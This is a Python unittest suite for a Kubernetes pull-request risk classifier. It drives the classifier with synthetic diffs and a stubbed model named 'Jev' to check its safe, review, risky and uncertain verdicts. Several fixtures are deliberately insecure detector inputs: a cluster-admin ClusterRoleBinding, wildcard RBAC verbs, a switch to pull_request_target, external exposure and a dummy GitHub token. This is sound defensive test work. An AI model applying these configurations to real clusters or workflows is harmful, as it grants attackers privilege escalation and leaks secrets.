"""The v2 decision model: surfaces, findings, evidence and policy, one scenario per case.

Each scenario is a bundle written from literal diffs, classified with a fake Jev that answers
every question it is asked with a clean "no" unless the test says otherwise. No network, no git.

    uv run --no-project --python 3.13 -m unittest discover .github/scripts/pr-risk/tests
"""

import copy
import json
import re
import shutil
import sys
import tempfile
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest import mock

HERE = Path(__file__).resolve().parent
FIX = HERE / "fixtures"
sys.path.insert(0, str(HERE.parent))

import pr_risk as p  # noqa: E402
import rules  # noqa: E402
import semantic  # noqa: E402
import taxonomy  # noqa: E402


def load(name):
    return json.loads((FIX / name).read_text())


def mkdiff(path: str, body: str, status: str = "M", header: str = "") -> str:
    """A git diff for one file; `body` is hunk lines with their +/-/space prefixes."""
    body = "\n".join(line if line[:1] in "+-" else " " + line for line in body.strip("\n").splitlines())
    mode = {"A": "new file mode 100644\n", "D": "deleted file mode 100644\n"}.get(status, "")
    return f"diff --git a/{path} b/{path}\n{mode}index 1111111..2222222 100644\n--- a/{path}\n+++ b/{path}\n@@ -1,9 +1,9 @@ {header}\n{body}\n"


def files_of(diff: str) -> list[dict]:
    out = []
    for part in re.split(r"(?m)^(?=diff --git )", diff):
        if not part.startswith("diff --git"):
            continue
        path = re.match(r"diff --git a/(.*?) b/(.*)", part).group(2)
        status = "A" if "\nnew file mode" in part else "D" if "\ndeleted file mode" in part else "M"
        body = part.split("\n@@", 1)[-1].splitlines()[1:]
        out.append({"status": status, "path": path, "binary": False,
                    "additions": sum(1 for x in body if x.startswith("+")), "deletions": sum(1 for x in body if x.startswith("-"))})  # fmt: skip
    return out


def konflate_fresh(warnings=None, failures=None, images=None, crds=0, head="fa8b5186bf82ba379efa242c6445f6ab668eea34", **extra):
    k = load("konflate_summary_179.json")
    k["diff"].update(headSha=head, warnings=warnings, failures=failures, images=images or [], **extra)
    k["diff"]["impact"]["crds"] = crds
    return {"state": "fresh", "summary": k}


def crd_kdiff(title, rows, status="changed", parent="HelmRelease network/tailscale-operator"):
    return {"diff": {"resources": [{"kind": "CustomResourceDefinition", "title": title, "status": status, "parent": parent,
                                    "unified": [{"kind": k, "html": h} for k, h in rows]}]}}  # fmt: skip


RENOVATE_NOTES = """This PR contains the following updates:

| Package | Update | Change |
|---|---|---|
| [ghcr.io/foo/foo](https://redirect.github.com/foo/foo) | minor | `v0.8.2` → `v0.9.0` |

---

### Release Notes

<details>
<summary>foo/foo (ghcr.io/foo/foo)</summary>

### [`v0.9.0`](https://redirect.github.com/foo/foo/releases/tag/v0.9.0)

{notes}

</details>

---

### Configuration

🚦 **Automerge**: Disabled by config.
"""


class Jev:
    """A fake Jev: a clean answer to every question it's asked, unless overridden."""

    def __init__(self, overrides=None, fail=()):
        self.overrides, self.fail, self.asked, self.states = overrides or {}, set(fail), {}, {}

    def __call__(self, name, state, questions):
        if name in self.fail:
            raise p.JevError("HTTP 503: overloaded")
        self.asked[name], self.states[name] = sorted(questions), state
        clean = {"description_matches": 0.95}
        answers = {q: {"type": "noul", "noul": self.overrides.get(q, clean.get(q, 0.03))} for q in questions}
        return {"model": "jev-test", "usage": {"input_tokens": 1}, "answers": answers}


class Scenario:
    def __init__(self, *diffs, title="fix: tweak", body="", author="owner", labels=(), konflate="auto", kdiff=None,
                 conflict=False, overlap=(), base_diff="", notes=None, secrets=None, components=None, visibility="public",
                 config=None, binary=(), commits=1, checks=None):  # fmt: skip
        self.dir = Path(tempfile.mkdtemp())
        diff = "".join(diffs)
        files = files_of(diff) + [{"status": "M", "path": b, "binary": True, "additions": 0, "deletions": 0} for b in binary]
        meta = {"number": 999, "title": title, "body": body, "author": author, "author_kind": author, "labels": list(labels),
                "repo_visibility": visibility, "head_sha": "fa8b5186bf82ba379efa242c6445f6ab668eea34", "commits": commits}  # fmt: skip
        if konflate == "auto":
            konflate = konflate_fresh() if any(p.rendered_path(f["path"]) for f in files) else {"state": "skipped", "summary": {}}
        w = lambda n, v: (self.dir / n).write_text(v if isinstance(v, str) else json.dumps(v))  # noqa: E731
        w("meta.json", meta)
        w("files.json", files)
        w("pr.diff", diff)
        w("konflate.json", konflate)
        w("conflict.json", {"conflict": conflict, "files": ["x.yaml"] if conflict else []})
        w("overlap.json", list(overlap))
        w("config.json", config or {})
        w("components.json", components or [])
        w("secrets.json", secrets or [])
        if checks is not None:
            w("checks.json", checks)
        if base_diff:
            w("base_overlap.diff", base_diff)
        if kdiff is not None:
            w("konflate_diff.json", kdiff)
        if notes is not None:
            w("release_notes.json", notes)

    def run(self, jev=None, key="k"):
        self.jev = jev if jev is not None else Jev()
        try:
            self.r = p.classify(self.dir, key=key, model="jev-test", answer=self.jev if key else None)
        finally:
            shutil.rmtree(self.dir)
        return self.r


def codes(r, certainty=None):
    return {f["code"] for f in r["findings"] if certainty is None or f["certainty"] in certainty}


NO_NOTES = {"source": "none", "sections": [], "reason": "not a Renovate PR"}

# Real shapes, reused below.
APP_HR = "kubernetes/apps/default/whoami/app/helmrelease.yaml"
PAPERLESS_HR = "kubernetes/apps/default/paperless/app/helmrelease.yaml"
DIGEST_BUMP = mkdiff(APP_HR, """\
      containers:
        app:
          image:
            repository: ghcr.io/traefik/whoami
-            tag: v1.10.1@sha256:1111111111111111111111111111111111111111111111111111111111111111
+            tag: v1.10.2@sha256:2222222222222222222222222222222222222222222222222222222222222222
""", header="spec:")  # fmt: skip


class Assertions(unittest.TestCase):
    def verdict(self, r, classification, uncertain=False, rule=None):
        got = (r["classification"], r["uncertain"])
        self.assertEqual(got, (classification, uncertain), json.dumps({k: r[k] for k in ("why", "findings")}, indent=1))
        if rule:
            self.assertEqual(r["rule"], rule)


# ── Safe ─────────────────────────────────────────────────────────────────────────────────────


class TestSafe(Assertions):
    def test_docs_only_needs_no_model(self):
        jev = Jev(fail={"raw", "rendered"})
        r = Scenario(mkdiff("kubernetes/apps/default/README.md", "-old words\n+new words")).run(jev)
        self.verdict(r, "safe", rule="R4")
        self.assertEqual(jev.asked, {})
        self.assertEqual(r["status"], "classified")
        self.assertEqual(r["dimensions"]["reach"], "none")

    def test_routine_image_digest_bump(self):
        r = Scenario(DIGEST_BUMP, title="fix(container): update image ghcr.io/traefik/whoami (v1.10.1 ➔ v1.10.2)", author="renovate").run()
        self.verdict(r, "safe", rule="R4")
        self.assertEqual(r["surfaces"][0]["evidence"], {"git": "sufficient", "render": "sufficient", "model": "sufficient", "invariants": "sufficient"})

    def test_clean_cilium_patch_is_safe_despite_cluster_reach(self):
        diff = mkdiff("kubernetes/apps/kube-system/cilium/app/ocirepository.yaml", "  ref:\n-    tag: 1.18.1\n+    tag: 1.18.2", header="spec:")
        r = Scenario(diff, title="fix(helm): update chart cilium (1.18.1 ➔ 1.18.2)", author="renovate").run()
        self.verdict(r, "safe", rule="R4")
        self.assertEqual(r["dimensions"]["reach"], "cluster")
        self.assertIn("control_plane", r["dimensions"]["stakes"])

    def test_ordinary_app_config_change(self):
        diff = mkdiff(APP_HR, "          env:\n-            TZ: UTC\n+            TZ: Europe/Amsterdam", header="spec:")
        jev = Jev()
        r = Scenario(diff).run(jev)
        self.verdict(r, "safe")
        self.assertIn("setting_conflict", jev.asked["raw"])  # a config change is checked against the repo's rules
        self.assertIn("invariants", jev.states["raw"])


# ── Review ───────────────────────────────────────────────────────────────────────────────────


class TestReview(Assertions):
    def test_zero_x_bump_without_release_notes(self):
        # #179, as collected: 0.16 → 0.17 of a 0.x chart, nothing in the PR body.
        d = Path(tempfile.mkdtemp())
        shutil.copytree(FIX / "bundle_179", d, dirs_exist_ok=True)
        try:
            r = p.classify(d, key=None, model="jev-1.13.0", fixture=load("jev_179.json"))
        finally:
            shutil.rmtree(d)
        self.verdict(r, "review", rule="R3")
        self.assertEqual(codes(r), {"ev.release_notes_missing"})
        self.assertEqual(r["surfaces"][0]["evidence"]["release_notes"], "limited")
        # no notes on a Renovate PR: breaking_notes has nothing to read, so it isn't asked (#202)
        self.assertEqual(r["jev"]["asked"], {"raw": ["description_matches", "manipulation_attempt"]})

    def test_breaking_change_elsewhere(self):
        body = RENOVATE_NOTES.format(notes="- BREAKING: `other.setting` was removed")
        notes = {"source": "renovate", "sections": [{"version": "v0.9.0", "text": "### v0.9.0\n\n- BREAKING: `other.setting` was removed"}], "reason": "r"}
        r = Scenario(DIGEST_BUMP, title="feat(container)!: update foo (v0.8.2 ➔ v0.9.0)", body=body, author="renovate", notes=notes,
                     config={APP_HR: "foo: 1\n"}).run(Jev({"breaking_notes": 0.9, "breaking_affects_config": 0.05}))  # fmt: skip
        self.verdict(r, "review", rule="R3")
        self.assertIn("compat.breaking_change_elsewhere", codes(r))

    def test_bounded_resource_envelope_reduction(self):
        diff = mkdiff(APP_HR, """\
            resources:
              requests:
                memory: 256Mi
              limits:
-                memory: 2Gi
+                memory: 1Gi
""", header="spec:")  # fmt: skip
        jev = Jev()
        r = Scenario(diff).run(jev)
        self.verdict(r, "review", rule="R3")
        self.assertIn("avail.resource_envelope_changed", codes(r, {"possible"}))
        self.assertIn("resource_envelope_risk", jev.asked["raw"])

    def test_non_reversible_but_understood(self):
        diff = mkdiff("kubernetes/components/postgres/cluster.yaml", """\
  instances: ${POSTGRES_INSTANCES:=1}
-  imageName: ghcr.io/cloudnative-pg/postgresql:17.5-standard-trixie@sha256:1111111111111111111111111111111111111111111111111111111111111111
+  imageName: ghcr.io/cloudnative-pg/postgresql:18.0-standard-trixie@sha256:2222222222222222222222222222222222222222222222222222222222222222
""", header="spec:")  # fmt: skip
        jev = Jev()
        r = Scenario(diff, title="feat(container)!: update postgresql (17.5 ➔ 18.0)", labels=["type/major"], author="renovate",
                     notes={"source": "github", "sections": [{"version": "18.0", "text": "### 18.0\n\n- new major release notes here"}], "reason": "r"}).run(jev)  # fmt: skip
        self.verdict(r, "review", rule="R3")
        self.assertIn("data.engine_major_upgrade", codes(r))
        self.assertEqual(r["dimensions"]["reversibility"], "non_reversible")
        self.assertIn("forward_only_migration", jev.asked["raw"])

    def test_control_plane_defaults_need_a_human(self):
        diff = mkdiff("kubernetes/clusters/main/apps.yaml", "            retryInterval: 2m\n-            timeout: 15m\n+            timeout: 20m", header="spec:")
        jev = Jev()
        r = Scenario(diff, title="fix(flux): longer default timeout").run(jev)
        self.verdict(r, "review", rule="R3")
        self.assertIn("recon.cluster_defaults_changed", codes(r))
        self.assertIn("cluster_defaults_changed", jev.asked["raw"])

    def test_major_with_fetched_notes_is_checked_not_flagged(self):
        notes = {"source": "github", "sections": [{"version": "v2.0.0", "text": "### v2.0.0\n\n- feat: add a new thing"}], "reason": "r"}
        r = Scenario(DIGEST_BUMP, title="feat(container)!: update foo (1.0 ➔ 2.0)", labels=["type/major"], author="renovate", notes=notes).run()
        self.verdict(r, "safe")
        self.assertIn("ctx.version_boundary", {c["code"] for c in r["context"]})

    def test_partial_release_notes_are_a_bounded_gap(self):
        notes = {"source": "github", "sections": [{"version": "v2.0.0", "text": "### v2.0.0\n\n- feat: add a new thing"}],
                 "reason": "Renovate found no release notes; foo: GitHub releases of foo/foo, back to v1.5.0 only"}  # fmt: skip
        r = Scenario(DIGEST_BUMP, title="feat(container)!: update foo (1.0 ➔ 2.0)", labels=["type/major"], author="renovate", notes=notes).run()
        self.verdict(r, "review")
        self.assertIn("ev.release_notes_partial", codes(r))  # a bundle from before `partial`: the phrase
        r = Scenario(DIGEST_BUMP, title="feat(container)!: update foo (1.0 ➔ 2.0)", labels=["type/major"], author="renovate",
                     notes={**notes, "reason": "r", "partial": True}).run()  # fmt: skip
        self.assertIn("ev.release_notes_partial", codes(r))

    def test_complete_notes_after_pointer_only_ones_are_not_partial(self):
        # "only" in the reason is about Renovate's notes, not about the range the lookup covered
        notes = {"source": "github", "sections": [{"version": "v2.0.0", "text": "### v2.0.0\n\n- feat: add a new thing"}], "partial": False,
                 "reason": "Renovate's notes only point elsewhere; foo: GitHub releases of foo/foo"}  # fmt: skip
        r = Scenario(DIGEST_BUMP, title="feat(container)!: update foo (1.0 ➔ 2.0)", labels=["type/major"], author="renovate", notes=notes).run()
        self.verdict(r, "safe")
        self.assertNotIn("ev.release_notes_partial", codes(r))


# ── Risky ────────────────────────────────────────────────────────────────────────────────────


class TestRisky(Assertions):
    def test_removed_pvc(self):
        k = konflate_fresh(warnings=[{"level": "blocking", "rule": "removed-pvc", "resource": "PersistentVolumeClaim default/whoami"}])
        r = Scenario(DIGEST_BUMP, konflate=k).run()
        self.verdict(r, "risky", rule="R1")
        self.assertIn("data.volume_removed", codes(r))

    def test_pvc_identity_change(self):
        diff = mkdiff(PAPERLESS_HR, """\
    persistence:
      data:
-        existingClaim: paperless-ngx
+        existingClaim: paperless
""", header="spec:")  # fmt: skip
        r = Scenario(diff).run()
        self.verdict(r, "risky", rule="R1")
        self.assertIn("data.volume_identity_changed", codes(r, {"established"}))
        self.assertEqual(r["dimensions"]["reversibility"], "non_reversible")

    def test_storage_class_change(self):
        """Immutable on a PVC (risky); on a CNPG Cluster only new instances use it (review)."""
        diff = mkdiff(PAPERLESS_HR, "    persistence:\n      data:\n-        storageClass: ceph-block\n+        storageClass: openebs-hostpath", header="spec:")
        self.verdict(Scenario(diff).run(), "risky")
        path = "kubernetes/components/postgres/cluster.yaml"
        cnpg = mkdiff(path, "  storage:\n-    storageClass: ceph-block\n+    storageClass: openebs-hostpath", header="spec:")
        r = Scenario(cnpg, config={path: "apiVersion: postgresql.cnpg.io/v1\nkind: Cluster\n"}).run()
        self.verdict(r, "review")
        self.assertIn("integrity.apply_rejected", codes(r, {"possible"}))

    def test_pvc_shrink(self):
        diff = mkdiff(PAPERLESS_HR, "    persistence:\n      data:\n        type: persistentVolumeClaim\n-        size: 10Gi\n+        size: 5Gi", header="spec:")
        r = Scenario(diff).run()
        self.verdict(r, "risky")
        self.assertIn("integrity.apply_rejected", codes(r))

    def test_dangling_depends_on(self):
        k = konflate_fresh(warnings=[{"level": "caution", "rule": "dangling-dependson", "resource": "Kustomization default/whoami",
                                      "detail": "removed, but still declared in spec.dependsOn by Kustomization default/other"}])  # fmt: skip
        r = Scenario(DIGEST_BUMP, konflate=k).run()
        self.verdict(r, "risky")
        self.assertIn("integrity.dependency_unsatisfiable", codes(r))

    def test_confirmed_merge_conflict_is_risky_and_jev_cannot_lower_it(self):
        r = Scenario(DIGEST_BUMP, conflict=True).run()
        self.verdict(r, "risky", rule="R1")
        self.assertIn("integrity.merge_conflict", codes(r))

    def test_crd_version_removal(self):
        diff = mkdiff("kubernetes/apps/network/tailscale-operator/app/ocirepository.yaml", "  ref:\n-    tag: 1.98.4\n+    tag: 1.102.4", header="spec:")
        kdiff = crd_kdiff("CustomResourceDefinition connectors.tailscale.com", [("ctx", "  - name: v1alpha1"), ("del", "    served: true"), ("add", "    served: false")])
        r = Scenario(diff, kdiff=kdiff, konflate=konflate_fresh(crds=1)).run()
        self.verdict(r, "risky")
        self.assertIn("compat.crd_version_dropped", codes(r))

    def test_rbac_privilege_escalation(self):
        diff = mkdiff("kubernetes/apps/default/whoami/app/rbac.yaml", """\
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: whoami
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: ClusterRole
+  name: cluster-admin
+subjects:
+  - kind: ServiceAccount
+    name: whoami
""", status="A")  # fmt: skip
        r = Scenario(diff).run()
        self.verdict(r, "risky")
        f = next(x for x in r["findings"] if x["code"] == "sec.rbac_widened")
        self.assertEqual((f["certainty"], f["consequence"]), ("established", "privilege_escalation"))

    def test_wildcard_verbs_rendered(self):
        kdiff = {"diff": {"resources": [{"kind": "ClusterRole", "title": "ClusterRole whoami", "status": "changed", "parent": "HelmRelease default/whoami",
                 "unified": [{"kind": "ctx", "html": "rules:"}, {"kind": "ctx", "html": "  - apiGroups: [\"\"]"},
                             {"kind": "ctx", "html": "    verbs:"}, {"kind": "add", "html": "      - &#39;*&#39;"}]}]}}  # fmt: skip
        r = Scenario(DIGEST_BUMP, kdiff=kdiff).run()
        self.verdict(r, "risky")
        self.assertIn("sec.rbac_widened", codes(r, {"established"}))

    def test_unauthenticated_external_exposure(self):
        diff = mkdiff("kubernetes/apps/default/whoami/app/httproute.yaml", """\
  parentRefs:
-    - name: envoy-internal
+    - name: envoy-external
      namespace: network
""", header="spec:")  # fmt: skip
        jev = Jev({"unauthenticated_external_exposure": 0.9})
        r = Scenario(diff).run(jev)
        self.verdict(r, "risky")
        found = {(x["kind"], x["certainty"]) for x in r["findings"] if x["code"] == "sec.exposure_widened"}
        self.assertEqual(found, {("obligation", "established"), ("mechanism", "probable")})  # exposed; and without auth
        # With authentication in front, the same exposure is a review obligation.
        r = Scenario(diff).run(Jev())
        self.verdict(r, "review")
        self.assertIn("sec.exposure_widened", codes(r, {"established"}))

    def test_forward_only_migration_on_data(self):
        diff = mkdiff(PAPERLESS_HR, """\
    persistence:
      data:
        existingClaim: paperless
    controllers:
      paperless:
        containers:
          app:
            image:
-              tag: 2.9.0
+              tag: 3.0.0
""", header="spec:")  # fmt: skip
        notes = {"source": "renovate", "sections": [{"version": "3.0.0", "text": "### 3.0.0\n\n- the database is migrated on start and 2.x can't read it"}], "reason": "r"}
        r = Scenario(diff, title="feat(container)!: update paperless (2.9.0 ➔ 3.0.0)", labels=["type/major"], author="renovate", notes=notes,
                     config={PAPERLESS_HR: "persistence:\n  data:\n    existingClaim: paperless\n"}).run(Jev({"forward_only_migration": 0.9}))  # fmt: skip
        self.verdict(r, "risky")
        self.assertIn("data.forward_only_migration", codes(r, {"probable"}))

    def test_pr_caused_render_failure(self):
        k = konflate_fresh(failures=[{"parent": "HelmRelease default/whoami", "message": "values don't meet the specifications of the schema"}])
        r = Scenario(DIGEST_BUMP, konflate=k).run()
        self.verdict(r, "risky")
        self.assertIn("integrity.render_failed", codes(r))

    def test_component_contract_break(self):
        diff = mkdiff("kubernetes/apps/default/paperless/ks.yaml", "    substitute:\n      APP: *app\n-      POSTGRES_X: y", header="spec:")
        comps = [{"ks": "kubernetes/apps/default/paperless/ks.yaml", "doc": "paperless", "component": "kubernetes/components/postgres",
                  "missing_head": ["POSTGRES_X"], "missing_base": [], "unknown": False}]  # fmt: skip
        r = Scenario(diff, components=comps).run()
        self.verdict(r, "risky")
        self.assertIn("recon.component_contract_broken", codes(r))

    def test_immutable_non_job(self):
        k = konflate_fresh(warnings=[{"level": "caution", "rule": "immutable-field", "resource": "StatefulSet default/forgejo"}])
        self.verdict(Scenario(DIGEST_BUMP, konflate=k).run(), "risky")

    def test_blocking_and_missing_image(self):
        k = konflate_fresh(images=[{"name": "ghcr.io/traefik/whoami", "from": "v1", "to": "v2", "refs": ["Deployment default/whoami"], "upstream": "missing"}])
        r = Scenario(DIGEST_BUMP, konflate=k).run()
        self.verdict(r, "risky")
        self.assertIn("integrity.image_unresolvable", codes(r))

    def test_plaintext_secret_in_public_repo(self):
        diff = mkdiff("kubernetes/apps/default/whoami/app/helmrelease.yaml", "          env:\n+            TOKEN: ghp_" + "a" * 36, header="spec:")
        jev = Jev()
        r = Scenario(diff).run(jev)
        self.verdict(r, "risky")
        self.assertIn("sec.secret_material_in_git", codes(r, {"established"}))
        self.assertNotIn("ghp_", json.dumps(jev.states))  # never sent to Jev
        self.assertNotIn("ghp_", json.dumps(r))  # never in the result
        # Private: still a finding, but a review one.
        self.verdict(Scenario(diff, visibility="private").run(), "review")

    def test_secret_in_pr_body_never_reaches_jev(self):
        token = "ghp_" + "b" * 36
        jev = Jev()
        r = Scenario(DIGEST_BUMP, title=f"fix: rotate {token}", body=f"old token was {token}").run(jev)
        self.assertNotIn(token, json.dumps(jev.states))
        self.assertNotIn(token, json.dumps(r))

    def test_pull_request_target(self):
        diff = mkdiff(".github/workflows/x.yaml", "on:\n-  pull_request:\n+  pull_request_target:")
        r = Scenario(diff).run()
        self.verdict(r, "risky")
        self.assertIn("exec.workflow_privilege_widened", codes(r))


# ── Uncertain ────────────────────────────────────────────────────────────────────────────────


class TestUncertain(Assertions):
    def test_jev_unavailable_fails_open(self):
        r = Scenario(DIGEST_BUMP).run(Jev(fail={"raw"}))
        self.verdict(r, "review", uncertain=True, rule="R2")
        self.assertEqual(r["status"], "unavailable")
        self.assertEqual(r["outage"], ["Jev"])
        self.assertIn("ev.model_unavailable", codes(r))
        self.assertIn("PR risk unavailable: Jev down", p.render_comment(r))
        r = Scenario(DIGEST_BUMP).run(key=None)  # no key at all: the same
        self.assertEqual((r["status"], r["classification"], r["uncertain"]), ("unavailable", "review", True))

    def test_konflate_unavailable_fails_open(self):
        r = Scenario(DIGEST_BUMP, konflate={"state": "unavailable", "summary": {"reason": "Konflate unreachable"}}).run()
        self.verdict(r, "review", uncertain=True)
        self.assertEqual(r["outage"], ["Konflate"])
        self.assertIn("ev.render_missing", codes(r))

    def test_required_render_missing(self):
        r = Scenario(DIGEST_BUMP, konflate={"state": "stale", "summary": {"reason": "rendering"}}).run()
        self.verdict(r, "review", uncertain=True, rule="R2")
        self.assertEqual(r["status"], "classified")  # a slow render is evidence about this PR's run, not an outage

    def test_model_input_truncated(self):
        big = "\n".join(f"+          KEY_{i}: {'x' * 60}" for i in range(400))
        diff = mkdiff(APP_HR, "          env:\n" + big, header="spec:")
        r = Scenario(diff).run()
        self.verdict(r, "review", uncertain=True)
        self.assertIn("ev.model_input_truncated", codes(r))

    def test_manipulation_attempt_is_uncertain_not_risky(self):
        r = Scenario(DIGEST_BUMP).run(Jev({"manipulation_attempt": 0.97}))
        self.verdict(r, "review", uncertain=True, rule="R2")
        self.assertIn("ev.manipulation_attempt", codes(r))
        self.assertEqual(r["surfaces"][0]["evidence"]["model"], "insufficient")

    def test_merge_result_unknown(self):
        r = Scenario(DIGEST_BUMP, conflict=None).run()
        self.verdict(r, "review", uncertain=True)
        self.assertIn("ev.merge_result_unknown", codes(r))
        self.assertNotIn("integrity.merge_conflict", codes(r))

    def test_fence_sitting_answer(self):
        r = Scenario(DIGEST_BUMP).run(Jev({"breaking_notes": 0.5}))
        self.verdict(r, "review", uncertain=True)
        self.assertIn("ev.model_indecisive", codes(r))

    def test_infra_render_failure_is_evidence_not_a_finding(self):
        # #175: Konflate's runner couldn't reach ghcr.io; the flux-operator HelmRelease only
        # looks removed because it didn't render, so dangling-dependson isn't a finding either.
        diff = mkdiff("kubernetes/apps/flux-system/flux-operator/app/ocirepository.yaml", "  ref:\n-    tag: 0.57.0\n+    tag: 0.60.0", header="spec:")
        k = {"state": "fresh", "summary": load("konflate_summary_175.json")}
        r = Scenario(diff, konflate=k).run()
        self.verdict(r, "review", uncertain=True)
        self.assertIn("ev.render_incomplete", codes(r))
        self.assertNotIn("integrity.dependency_unsatisfiable", codes(r))
        self.assertNotIn("integrity.render_failed", codes(r))

    def test_opaque_file(self):
        r = Scenario(DIGEST_BUMP, binary=["kubernetes/apps/default/whoami/app/blob.bin"]).run()
        self.verdict(r, "review", uncertain=True)
        self.assertIn("ev.opaque_content", codes(r))

    def test_unknown_konflate_rule_is_conservative(self):
        k = konflate_fresh(warnings=[{"level": "caution", "rule": "brand-new-rule", "resource": "Deployment default/whoami"}])
        r = Scenario(DIGEST_BUMP, konflate=k).run()
        self.verdict(r, "review")
        self.assertIn("ev.unknown_signal", codes(r))
        k["summary"]["diff"]["warnings"][0]["level"] = "blocking"
        self.verdict(Scenario(DIGEST_BUMP, konflate=k).run(), "review", uncertain=True)


# ── Historical regressions ───────────────────────────────────────────────────────────────────


class TestRegressions(Assertions):
    def test_paperless_memory_limit_cf4bee2(self):
        """The 2026-07-29 memory-limit change the first backtest labelled safe: 4Gi → 12Gi,
        reverted the next day. No longer safe, even with every Jev answer clean."""
        diff = mkdiff("kubernetes/apps/documents/paperless-ngx/app/helmrelease.yaml", """\
              requests:
                cpu: 250m
                memory: 2Gi
+              # TEMPORARY: bumped from 4Gi - document_archiver -f OOMKilled the container
+              # twice (2026-07-28) reprocessing the imported TrueNAS backup.
              limits:
-                memory: 4Gi
+                memory: 12Gi
          gotenberg:
""", header="spec:")  # fmt: skip
        jev = Jev()
        r = Scenario(diff, title="fix(paperless-ngx): increase memory limit to 12Gi for document archiver").run(jev)
        self.verdict(r, "review")
        self.assertIn("avail.resource_envelope_changed", codes(r))
        self.assertIn("resource_envelope_risk", jev.asked["raw"])

    def test_envoy_gateway_certgen_hook(self):
        """Envoy Gateway's certgen Job is a Helm hook Helm deletes and recreates, so Konflate's
        immutable-field warning on it is context, not a failed apply."""
        rows = [("ctx", "metadata:"), ("ctx", "  annotations:"), ("ctx", "    helm.sh/hook: pre-install, pre-upgrade"),
                ("ctx", "    helm.sh/hook-delete-policy: before-hook-creation,hook-succeeded"), ("del", "        image: envoyproxy/gateway:v1.5.0"),
                ("add", "        image: envoyproxy/gateway:v1.5.1")]  # fmt: skip
        kdiff = {"diff": {"resources": [{"kind": "Job", "title": "Job network/envoy-gateway-certgen", "status": "changed", "parent": "HelmRelease network/envoy-gateway",
                                         "unified": [{"kind": k, "html": h, "folded": k == "ctx"} for k, h in rows]}]}}  # fmt: skip
        k = konflate_fresh(warnings=[{"level": "caution", "rule": "immutable-field", "resource": "Job network/envoy-gateway-certgen"}])
        diff = mkdiff("kubernetes/apps/network/envoy-gateway/app/ocirepository.yaml", "  ref:\n-    tag: v1.5.0\n+    tag: v1.5.1", header="spec:")
        r = Scenario(diff, konflate=k, kdiff=kdiff, title="fix(helm): update chart envoy-gateway (v1.5.0 ➔ v1.5.1)", author="renovate").run()
        self.verdict(r, "safe")
        self.assertIn("ctx.helm_hook_recreated", {c["code"] for c in r["context"]})

    def test_envoy_gateway_certgen_without_delete_policy_184(self):
        """#184, as Konflate rendered it: the certgen Job has `helm.sh/hook` and no delete
        policy, and Helm's default is before-hook-creation."""
        rows = [("ctx", "    helm.sh/hook: pre-install, pre-upgrade"), ("del", "        image: docker.io/envoyproxy/gateway:v1.9.1"),
                ("add", "        image: docker.io/envoyproxy/gateway:v1.9.2")]  # fmt: skip
        kdiff = {"diff": {"resources": [{"kind": "Job", "title": "Job network/envoy-gateway-gateway-helm-certgen", "status": "changed",
                                         "parent": "HelmRelease network/envoy-gateway",
                                         "unified": [{"kind": k, "html": h, "folded": k == "ctx"} for k, h in rows]}]}}  # fmt: skip
        k = konflate_fresh(warnings=[{"level": "caution", "rule": "immutable-field", "resource": "Job network/envoy-gateway-gateway-helm-certgen"}])
        diff = mkdiff("kubernetes/apps/network/envoy-gateway/app/helmrelease.yaml", "          image:\n-            tag: v1.9.1\n+            tag: v1.9.2", header="spec:")
        r = Scenario(diff, konflate=k, kdiff=kdiff, title="fix(container): update image docker.io/envoyproxy/gateway (v1.9.1 ➔ v1.9.2)", author="renovate").run()
        self.verdict(r, "safe")
        self.assertIn("ctx.helm_hook_recreated", {c["code"] for c in r["context"]})

    def test_namespace_added_to_cluster_apps_77(self):
        """#77 added `./documents` to kubernetes/apps/kustomization.yaml: nothing existing changes.
        Dropping one prunes the whole namespace."""
        path = "kubernetes/apps/kustomization.yaml"
        self.verdict(Scenario(mkdiff(path, "resources:\n  - ./default\n+  - ./documents", header="")).run(), "safe")
        r = Scenario(mkdiff(path, "resources:\n  - ./default\n-  - ./documents", header="")).run()
        self.verdict(r, "risky")
        self.assertIn("lifecycle.namespace_removed", codes(r))

    def test_bootstrap_version_pin_is_shown_by_the_diff(self):
        """The bootstrap helmfile's chart pins: nothing renders them, but a version string needs
        no render. A config change there does."""
        path = "bootstrap/kubernetes/helmfile/apps.yaml"
        self.verdict(Scenario(mkdiff(path, "  - name: cilium\n-    version: 1.17.6\n+    version: 1.19.3", header="releases:")).run(), "safe")
        r = Scenario(mkdiff(path, "  - name: cilium\n-    wait: true\n+    wait: false", header="releases:")).run()
        self.verdict(r, "review")
        self.assertIn("ev.unrendered_surface", codes(r))

    def test_folded_description_prose_is_not_schema_186(self):
        """#186: Konflate folded the `description:` line, so its prose looked like schema. The
        real change there (networkPolicyEnabled dropped) still counts."""
        prose = [("ctx", "                  description: |-", True), ("del", "                    This is a beta field and requires enabling X.", False),
                 ("add", "                    This field is GA.", False)]  # fmt: skip
        r = {"kind": "CustomResourceDefinition", "unified": [{"kind": k, "html": h, "folded": f} for k, h, f in prose]}
        self.assertFalse(p.crd_schema_changed(r))
        missing_key = {"kind": "CustomResourceDefinition", "unified": [{"kind": "del", "html": "                    This requires the ProcMountType feature flag."}]}
        self.assertFalse(p.crd_schema_changed(missing_key))  # the key line isn't in the diff at all
        field = {"kind": "CustomResourceDefinition", "unified": [{"kind": "del", "html": "              networkPolicyEnabled:"},
                                                                 {"kind": "del", "html": "                default: true"}]}  # fmt: skip
        self.assertTrue(p.crd_schema_changed(field))

    def test_crd_conversion_webhook_removed_171(self):
        """#171: the chart dropped the group-snapshot CRD's conversion webhook. A review
        obligation, not a narrowed schema, and the schema question isn't asked about it."""
        rows = [("ctx", "spec:"), ("del", "  conversion:"), ("del", "    strategy: Webhook"), ("del", "    webhook:"),
                ("del", "      clientConfig:"), ("del", "        service:"), ("del", "          name: snapshot-controller-conversion-webhook")]  # fmt: skip
        kdiff = crd_kdiff("CustomResourceDefinition volumegroupsnapshotcontents.groupsnapshot.storage.k8s.io", rows,
                          parent="HelmRelease system/snapshot-controller")  # fmt: skip
        self.assertFalse(p.any_crd_schema_change(kdiff))
        diff = mkdiff("kubernetes/apps/system/snapshot-controller/app/ocirepository.yaml", "  ref:\n-    tag: 5.1.1\n+    tag: 5.3.0", header="spec:")
        jev = Jev({"crd_schema_narrowed": 0.75})
        r = Scenario(diff, kdiff=kdiff, konflate=konflate_fresh(crds=1), author="renovate").run(jev)
        self.verdict(r, "review")
        self.assertIn("compat.crd_conversion_changed", codes(r))
        self.assertNotIn("crd_schema_narrowed", jev.asked.get("rendered", []))

